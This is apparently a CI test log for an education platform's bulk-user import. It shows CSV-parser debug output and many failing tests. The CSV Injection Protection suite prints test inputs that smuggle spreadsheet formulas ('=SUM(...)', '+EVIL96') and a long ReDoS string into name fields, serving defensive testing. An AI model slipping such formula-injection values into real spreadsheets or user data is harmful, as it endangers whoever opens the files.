2025-11-18T17:35:41.6624187Z   cellValues: [ [32m'user96@example.com'[39m, [32m'=SUM(A1:A96)'[39m, [32m'+EVIL96'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6624358Z   columnMapping: {
2025-11-18T17:35:41.6624586Z     email: [33m0[39m,
2025-11-18T17:35:41.6624787Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6624996Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6625186Z     role: [33m3[39m,
2025-11-18T17:35:41.6625380Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6625603Z     password: [33m-1[39m
2025-11-18T17:35:41.6625729Z   }
2025-11-18T17:35:41.6625870Z }
2025-11-18T17:35:41.6626128Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6626467Z   email: [32m'user96@example.com'[39m,
2025-11-18T17:35:41.6627030Z   firstName: [32m'=SUM(A1:A96)'[39m,
2025-11-18T17:35:41.6627333Z   lastName: [32m'+EVIL96'[39m,
2025-11-18T17:35:41.6627568Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6627837Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6627975Z }
2025-11-18T17:35:41.6628181Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6628424Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6629201Z   cellValues: [ [32m'user97@example.com'[39m, [32m'=SUM(A1:A97)'[39m, [32m'+EVIL97'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6629376Z   columnMapping: {
2025-11-18T17:35:41.6629609Z     email: [33m0[39m,
2025-11-18T17:35:41.6629809Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6630035Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6630227Z     role: [33m3[39m,
2025-11-18T17:35:41.6630411Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6630604Z     password: [33m-1[39m
2025-11-18T17:35:41.6630728Z   }
2025-11-18T17:35:41.6630853Z }
2025-11-18T17:35:41.6631091Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6631392Z   email: [32m'user97@example.com'[39m,
2025-11-18T17:35:41.6631668Z   firstName: [32m'=SUM(A1:A97)'[39m,
2025-11-18T17:35:41.6631915Z   lastName: [32m'+EVIL97'[39m,
2025-11-18T17:35:41.6632115Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6632633Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6632759Z }
2025-11-18T17:35:41.6632945Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6633175Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6633931Z   cellValues: [ [32m'user98@example.com'[39m, [32m'=SUM(A1:A98)'[39m, [32m'+EVIL98'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6634090Z   columnMapping: {
2025-11-18T17:35:41.6634300Z     email: [33m0[39m,
2025-11-18T17:35:41.6634528Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6634724Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6634911Z     role: [33m3[39m,
2025-11-18T17:35:41.6635123Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6635342Z     password: [33m-1[39m
2025-11-18T17:35:41.6635476Z   }
2025-11-18T17:35:41.6635605Z }
2025-11-18T17:35:41.6635852Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6636184Z   email: [32m'user98@example.com'[39m,
2025-11-18T17:35:41.6636463Z   firstName: [32m'=SUM(A1:A98)'[39m,
2025-11-18T17:35:41.6636734Z   lastName: [32m'+EVIL98'[39m,
2025-11-18T17:35:41.6637180Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6637444Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6637568Z }
2025-11-18T17:35:41.6637759Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6637967Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6638729Z   cellValues: [ [32m'user99@example.com'[39m, [32m'=SUM(A1:A99)'[39m, [32m'+EVIL99'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6639114Z   columnMapping: {
2025-11-18T17:35:41.6639360Z     email: [33m0[39m,
2025-11-18T17:35:41.6639590Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6639803Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6640013Z     role: [33m3[39m,
2025-11-18T17:35:41.6640208Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6640429Z     password: [33m-1[39m
2025-11-18T17:35:41.6640554Z   }
2025-11-18T17:35:41.6640675Z }
2025-11-18T17:35:41.6640929Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6641261Z   email: [32m'user99@example.com'[39m,
2025-11-18T17:35:41.6641560Z   firstName: [32m'=SUM(A1:A99)'[39m,
2025-11-18T17:35:41.6641841Z   lastName: [32m'+EVIL99'[39m,
2025-11-18T17:35:41.6642066Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6642325Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6642445Z }
2025-11-18T17:35:41.6642461Z 
2025-11-18T17:35:41.6644205Z [90mstdout[2m | __tests__/utils/csvInjectionProtection.test.ts[2m > [22m[2mCSV Injection Protection[2m > [22m[2mPerformance and Security[2m > [22m[2mshould not be vulnerable to ReDoS attacks[22m[39m
2025-11-18T17:35:41.6644465Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:41.6645214Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:41.6645953Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:41.6646095Z }
2025-11-18T17:35:41.6647517Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:41.6647756Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6648017Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6648157Z   cellValues: [
2025-11-18T17:35:41.6648452Z     [32m'test@example.com'[39m,
2025-11-18T17:35:41.6653552Z     [32m'=++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++A'[39m,
2025-11-18T17:35:41.6654093Z     [32m'Normal'[39m,
2025-11-18T17:35:41.6654314Z     [32m'docente'[39m
2025-11-18T17:35:41.6654438Z   ],
2025-11-18T17:35:41.6654607Z   columnMapping: {
2025-11-18T17:35:41.6654815Z     email: [33m0[39m,
2025-11-18T17:35:41.6655008Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6655201Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6655379Z     role: [33m3[39m,
2025-11-18T17:35:41.6655570Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6655791Z     password: [33m-1[39m
2025-11-18T17:35:41.6655922Z   }
2025-11-18T17:35:41.6656048Z }
2025-11-18T17:35:41.6656302Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6656604Z   email: [32m'test@example.com'[39m,
2025-11-18T17:35:41.6662280Z   firstName: [32m'=++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++A'[39m,
2025-11-18T17:35:41.6662722Z   lastName: [32m'Normal'[39m,
2025-11-18T17:35:41.6662956Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6663238Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6663362Z }
2025-11-18T17:35:41.6663378Z 
2025-11-18T17:35:41.6664325Z  [32m✓[39m __tests__/utils/csvInjectionProtection.test.ts [2m ([22m[2m25 tests[22m[2m)[22m[90m 43[2mms[22m[39m
2025-11-18T17:35:42.0628293Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:42.0630851Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:42.0633514Z  [33m❯[39m __tests__/quizSubmission.integration.test.ts [2m ([22m[2m12 tests[22m [2m|[22m [31m12 failed[39m[2m)[22m[90m 39[2mms[22m[39m
2025-11-18T17:35:42.0637554Z 
2025-11-18T17:35:42.0639183Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould submit quiz successfully with auto-grading[39m
2025-11-18T17:35:42.0640926Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0642861Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould handle submission errors gracefully[39m
2025-11-18T17:35:42.0643789Z [31m     → vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:35:42.0644888Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould trigger notification for open-ended questions[39m
2025-11-18T17:35:42.0645769Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0647107Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mgetQuizSubmission[2m > [22mshould fetch quiz submission with relations[39m
2025-11-18T17:35:42.0648380Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:42.0649539Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mgradeQuizOpenResponses[2m > [22mshould grade open-ended responses without exposing scores[39m
2025-11-18T17:35:42.0650503Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0651631Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mLearning-Focused Flow[2m > [22mshould not return scores to student-facing functions[39m
2025-11-18T17:35:42.0652530Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0654363Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mLearning-Focused Flow[2m > [22mshould support retry attempts without penalty[39m
2025-11-18T17:35:42.0656161Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0658531Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle RPC errors[39m
2025-11-18T17:35:42.0660166Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0661814Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle network errors[39m
2025-11-18T17:35:42.0663227Z [31m     → vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:35:42.0664931Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle missing required fields[39m
2025-11-18T17:35:42.0666383Z [31m     → vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:35:42.0668553Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mData Validation[2m > [22mshould validate answer format[39m
2025-11-18T17:35:42.0670157Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.0671870Z [31m   [33m❯[31m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mData Validation[2m > [22mshould handle empty quiz data[39m
2025-11-18T17:35:42.0673286Z [31m     → vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:35:42.5627596Z  [33m❯[39m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx [2m ([22m[2m18 tests[22m [2m|[22m [31m18 failed[39m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:42.5635402Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mrenders basic fields correctly[39m
2025-11-18T17:35:42.5636325Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5637620Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows resource buttons[39m
2025-11-18T17:35:42.5638436Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5639389Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22madds a link resource[39m
2025-11-18T17:35:42.5640131Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5641080Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22madds a document resource[39m
2025-11-18T17:35:42.5641826Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5643136Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mdisplays existing resources[39m
2025-11-18T17:35:42.5643909Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5645323Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mupdates resource fields[39m
2025-11-18T17:35:42.5647045Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5648926Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mdeletes a resource[39m
2025-11-18T17:35:42.5650408Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5652191Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mvalidates file upload functionality[39m
2025-11-18T17:35:42.5653547Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5655264Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows "Cambiar" button when document has URL[39m
2025-11-18T17:35:42.5656619Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5658968Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows empty state when no resources[39m
2025-11-18T17:35:42.5660362Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5662132Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mEdit Mode[2m > [22mshows note about resources visibility[39m
2025-11-18T17:35:42.5663493Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5665308Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mrenders assignment details in preview[39m
2025-11-18T17:35:42.5666700Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5668725Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mshows resources count in preview[39m
2025-11-18T17:35:42.5670143Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5671937Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mdisplays resource list in preview[39m
2025-11-18T17:35:42.5673326Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5675137Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mshows correct icons for resource types[39m
2025-11-18T17:35:42.5676936Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5678963Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mPreview Mode[2m > [22mdoes not show resources section when empty[39m
2025-11-18T17:35:42.5680394Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5682277Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mResource Management[2m > [22mhandles save button functionality[39m
2025-11-18T17:35:42.5683721Z [31m     → document is not defined[39m
2025-11-18T17:35:42.5685539Z [31m   [33m❯[31m __tests__/components/blocks/GroupAssignmentBlockEditor.test.tsx[2m > [22mGroupAssignmentBlockEditor[2m > [22mResource Management[2m > [22mmaintains resource order[39m
2025-11-18T17:35:42.5687149Z [31m     → document is not defined[39m
2025-11-18T17:35:43.0663439Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:43.0669208Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:43.0670523Z 
2025-11-18T17:35:43.0747461Z  [33m❯[39m __tests__/utils/assignmentFilters.test.js [2m ([22m[2m19 tests[22m [2m|[22m [31m9 failed[39m[2m)[22m[90m 51[2mms[22m[39m
2025-11-18T17:35:43.0750489Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould return all schools for admin users[39m
2025-11-18T17:35:43.0753592Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0755658Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould return only assigned schools for consultants[39m
2025-11-18T17:35:43.0758360Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0760270Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould handle errors gracefully[39m
2025-11-18T17:35:43.0761902Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0764115Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould return all communities for a school for admin[39m
2025-11-18T17:35:43.0765914Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0768240Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould filter communities for consultants[39m
2025-11-18T17:35:43.0769869Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0771850Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableCommunitiesForSchool[2m > [22mshould return all communities when no school is specified[39m
2025-11-18T17:35:43.0773492Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0775483Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould return empty array if school has no generations[39m
2025-11-18T17:35:43.0777433Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0779449Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould return generations for schools that have them[39m
2025-11-18T17:35:43.0781338Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.0783287Z [31m   [33m❯[31m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableGenerationsForSchool[2m > [22mshould filter generations for consultants[39m
2025-11-18T17:35:43.0784882Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:43.4899593Z  [33m❯[39m __tests__/utils/bulkUserParser.test.ts [2m ([22m[2m35 tests[22m [2m|[22m [31m21 failed[39m[2m)[22m[90m 44[2mms[22m[39m
2025-11-18T17:35:43.4902986Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect comma delimiter[39m
2025-11-18T17:35:43.4908933Z [31m     → detectDelimiter is not a function[39m
2025-11-18T17:35:43.4910623Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect tab delimiter[39m
2025-11-18T17:35:43.4915755Z [31m     → detectDelimiter is not a function[39m
2025-11-18T17:35:43.4917618Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect semicolon delimiter[39m
2025-11-18T17:35:43.4919420Z [31m     → detectDelimiter is not a function[39m
2025-11-18T17:35:43.4921211Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould detect pipe delimiter[39m
2025-11-18T17:35:43.4922608Z [31m     → detectDelimiter is not a function[39m
2025-11-18T17:35:43.4924621Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectDelimiter[2m > [22mshould default to comma when no clear delimiter[39m
2025-11-18T17:35:43.4926092Z [31m     → detectDelimiter is not a function[39m
2025-11-18T17:35:43.4932399Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould parse CSV without headers[39m
2025-11-18T17:35:43.4933719Z [31m     → La columna "email" es requerida.[39m
2025-11-18T17:35:43.4935171Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould validate roles[39m
2025-11-18T17:35:43.4936640Z [31m     → expected [ 'Rol \'invalid_role\' inválido' ] to include 'Rol inválido: invalid_role'[39m
2025-11-18T17:35:43.4938638Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould add warnings for Chilean emails without RUT[39m
2025-11-18T17:35:43.4940166Z [31m     → expected [ Array(1) ] to include 'Email chileno detectado - considere a…'[39m
2025-11-18T17:35:43.4941899Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mparseBulkUserData[2m > [22mshould add warnings for missing names[39m
2025-11-18T17:35:43.4943419Z [31m     → expected [ Array(1) ] to include 'Se recomienda incluir nombre y apelli…'[39m
2025-11-18T17:35:43.4945101Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mformatParsedData[2m > [22mshould format users as table[39m
2025-11-18T17:35:43.4946494Z [31m     → expected [ { email: 'john@test.com', …(5) } ] to include 'Email'[39m
2025-11-18T17:35:43.4948410Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mformatParsedData[2m > [22mshould handle missing values[39m
2025-11-18T17:35:43.4949859Z [31m     → expected [ { email: 'john@test.com', …(1) } ] to include 'john@test.com'[39m
2025-11-18T17:35:43.4951450Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mexportAsCSV[2m > [22mshould export users as CSV[39m
2025-11-18T17:35:43.4953392Z [31m     → expected 'email,firstName,lastName,role,rut\n"j…' to include 'email,firstName,lastName,role,rut,pas…'[39m
2025-11-18T17:35:43.4955379Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mexportAsCSV[2m > [22mshould quote values with special characters[39m
2025-11-18T17:35:43.4957155Z [31m     → expected 'email,firstName,lastName,role,rut\n"j…' to include '"O""Brien"'[39m
2025-11-18T17:35:43.4959027Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect admin role[39m
2025-11-18T17:35:43.4960306Z [31m     → detectRoleFromEmail is not a function[39m
2025-11-18T17:35:43.4961899Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect consultant role[39m
2025-11-18T17:35:43.4963177Z [31m     → detectRoleFromEmail is not a function[39m
2025-11-18T17:35:43.4965083Z [90mstderr[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould parse CSV without headers[22m[39m
2025-11-18T17:35:43.4966432Z [CSV-PARSER] CRITICAL: Email column not found in headers: []
2025-11-18T17:35:43.4967213Z 
2025-11-18T17:35:43.4968527Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould detect director role[39m
2025-11-18T17:35:43.4969792Z [31m     → detectRoleFromEmail is not a function[39m
2025-11-18T17:35:43.4971495Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mdetectRoleFromEmail[2m > [22mshould return null for unrecognized patterns[39m
2025-11-18T17:35:43.4972822Z [31m     → detectRoleFromEmail is not a function[39m
2025-11-18T17:35:43.4974453Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould generate sample CSV data[39m
2025-11-18T17:35:43.4976104Z [31m     → expected 'email,firstName,lastName,role,rut\n"j…' to include 'usuario1@ejemplo.cl'[39m
2025-11-18T17:35:43.4978201Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould generate admin for first user[39m
2025-11-18T17:35:43.4979722Z [31m     → expected '"juan.perez@ejemplo.com","Juan","Pére…' to include 'admin'[39m
2025-11-18T17:35:43.4981488Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould include RUT for first 3 users[39m
2025-11-18T17:35:43.4983066Z [31m     → expected '"juan.perez@ejemplo.com","Juan","Pére…' to include '11.111.111-1'[39m
2025-11-18T17:35:43.4984810Z [31m   [33m❯[31m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mIntegration tests[2m > [22mshould handle complete workflow[39m
2025-11-18T17:35:43.4986045Z [31m     → expected 0 to be greater than 0[39m
